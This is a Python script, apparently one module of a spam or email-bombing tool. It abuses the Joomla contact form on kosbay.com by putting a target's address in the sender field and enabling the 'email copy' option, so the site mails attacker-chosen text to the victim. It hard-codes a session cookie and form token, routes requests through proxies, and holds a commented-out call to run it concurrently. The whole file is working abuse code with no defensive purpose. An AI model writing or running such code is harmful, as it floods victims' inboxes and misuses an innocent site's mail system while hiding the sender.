from os.path import basename

import requests

from module import Spam

headers = {
    'authority': 'www.kosbay.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'origin': 'https://www.kosbay.com',
    'referer': 'https://www.kosbay.com/en/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cookies = {
            'cac84ef28387832a090730d2eee84f4f': '892f13f1d30fa32dd2fdf3fc5bb11e97',
        }

        data = {
            'jform[contact_email]': target,
            'jform[contact_name]': 'test',
            'jform[contact_subject]': self.get_text(),
            'jform[contact_message]': self.get_text(),
            'jform[contact_email_copy]': '1',
            'option': 'com_contact',
            'task': 'contact.submit',
            'return': '',
            'id': '1:website-owner',
            '64dbe80bf7c247cc1ab604a23a46745b': '1',
        }
        response = requests.post('https://www.kosbay.com/en/contact', headers=headers, data=data, cookies=cookies,
                                 proxies=self.get_proxies())
        return response


def main():
    success_message = 'Thank you for your email.'

    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), success_message)
    res = spam.send_post('wezxasqw@1secmail.com')
    # if res:
    #     spam.run_concurrently(10)


if __name__ == '__main__':
    main()
